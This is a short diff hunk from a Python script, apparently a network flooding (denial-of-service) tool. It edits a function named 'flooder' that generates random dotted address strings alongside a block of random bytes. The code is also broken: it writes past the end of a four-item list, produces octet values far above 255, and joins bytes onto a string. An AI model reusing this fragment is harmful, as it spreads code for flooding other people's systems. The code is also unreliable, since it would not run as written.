@@ -261,11 +261,11 @@ def flooder():
     sock3 = [192, 168, 0, 1]
     sock4 = random._urandom(10999)
     addr = "."
-    sock3[0] = str(random.randrange(11, 18928))
-    sock3[1] = str(random.randrange(11, 18928))
-    sock3[2] = str(random.randrange(11, 18928))
-    sock3[3] = str(random.randrange(11, 18928))
-    sock3[4] = str(random.randrange(11, 18928))
+    sock3[0] = str(random.randrange(18928))
+    sock3[1] = str(random.randrange(18928))
+    sock3[2] = str(random.randrange(18928))
+    sock3[3] = str(random.randrange(18928))
+    sock3[4] = str(random.randrange(18928))
     addres = sock3[0] + addr + sock3[1] + addr + sock3[2] + addr + sock3[3] + addr + sock4[4] + addr + "\r\n"
     return addres
 def start():
